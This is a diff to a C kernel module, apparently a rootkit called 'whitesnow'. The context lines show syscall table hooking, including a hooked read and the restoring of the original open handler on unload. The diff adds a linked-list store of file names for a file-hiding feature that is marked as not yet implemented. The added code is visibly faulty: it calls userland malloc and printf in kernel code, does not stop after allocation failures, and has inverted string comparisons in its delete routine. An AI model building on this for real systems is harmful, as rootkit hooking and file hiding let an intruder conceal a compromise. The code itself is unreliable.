@@ -55,6 +55,126 @@ asmlinkage ssize_t read_sysHooked(unsigned int fd, const char *buf, size_t count
 }
 
 
+/*
+  TAD - Linked list
+  ToDO -------- Hider/Unhider *Not implemented yet*
+*/
+typedef struct node {
+  char *file;
+  struct node *next;
+}nodetype;
+
+typedef nodetype *List;
+typedef nodetype *pNode;
+
+
+// Functions
+//List create_list(char *f);
+void list_addfile(List *list, char *f);
+int list_empty(List list);
+void show_list(List list);
+void list_delete(List *list);
+void list_deleteElement(List *list, char *f);
+
+/*List create_list(char *f) {
+
+  pNode new = (pNode)malloc(sizeof(nodetype));
+  if(new == NULL) 
+    printf("List -> Create_list: Node creation failed\n");
+    return NULL;
+    if((new->file = (char *)malloc(strlen(f)+1))==NULL)
+      printf("List -> Create_list: malloc failed\n");
+  new->next = NULL;
+
+  return new;
+}*/
+void list_addfile(List *list, char * f) {
+  pNode aux, aux2;
+  
+  if((aux = (pNode)malloc(sizeof(nodetype)))==NULL) {
+    printf("List -> list_addfile: Node creation failed\n");
+  }
+  if((aux->file = (char *)malloc(strlen(f)+1))==NULL)
+    printf("List -> list_addfile: malloc failed\n");
+  strcpy(aux->file, f);
+  // Empty list?
+  if(list_empty(*list)) {
+    aux->next = *list;
+    *list = aux; 
+  }
+  else {
+    aux2 = *list;
+    //while(aux2->next)
+    //    aux2 = aux2->next;
+    aux->next = aux2->next;
+    aux2->next = aux;
+  }
+}
+
+int list_empty(List list) {
+  return (list == NULL);
+}
+
+void show_list(List list) {
+  pNode aux = list;
+  if(list_empty(list))
+    printf("List -> show_list: Empty\n");
+  else {
+    while(aux) {
+      printf("File: %s\n", aux->file);
+      aux = aux->next;
+    }
+  }
+}
+
+int list_searchfile(List list, char *f) {
+  pNode aux = list;
+
+  while(aux) {
+    if(!strcmp(aux->file, f)) {
+      printf("List -> list_searchfile: Found string\n");
+      return 1;
+    }
+    aux = aux->next;
+  }
+
+  printf("List -> list_searchfile: Not found\n");
+  return 0;
+}
+
+void list_delete(List *list) {
+  pNode aux;
+
+  while(*list) {
+    aux = *list;
+    *list = aux->next;
+    free(aux);
+  }
+}
+
+void list_deleteElement(List *list, char *f) {
+  pNode aux, aux2;
+
+  aux = *list;
+  aux2 = NULL;
+
+  while(aux && !strcmp(aux->file, f)) {
+    aux2 = aux;
+    aux = aux->next;
+  }
+  if(!aux || !strcmp(aux->file, f))
+    printf("List -> list_deleteElement: Element not found\n");
+  else {
+    if(!aux2) {
+      *list = aux->next;
+      printf("List -> list_deleteElement: Element %s deleted\n", aux->file);
+    }
+    else
+      aux2->next = aux->next;
+    free(aux);
+  }
+}
+
 // Get the syscall table
 unsigned long* getSysCallTable()
 {
@@ -149,7 +269,7 @@ static int __init whitesnow_start(void) {
 static void __exit whitesnow_stop(void) {
 	//unsigned long *sys_call_table = 0xc0027004;  android-goldfish-2.6.29
   unsigned long *sys_call_table = getSysCallTable();
-
+  
 	if(sys_call_table != NULL) {
 		// Clean sys_call_table
 		sys_call_table[__NR_open] = orig_open;
